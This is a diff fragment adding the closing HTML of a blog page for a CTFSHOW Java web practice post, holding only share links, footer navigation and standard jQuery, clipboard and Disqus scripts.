+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&name=Practice - CTFSHOW WEB入门 JAVA篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&t=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    b_y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.7/dist/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'recharging-runtime';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
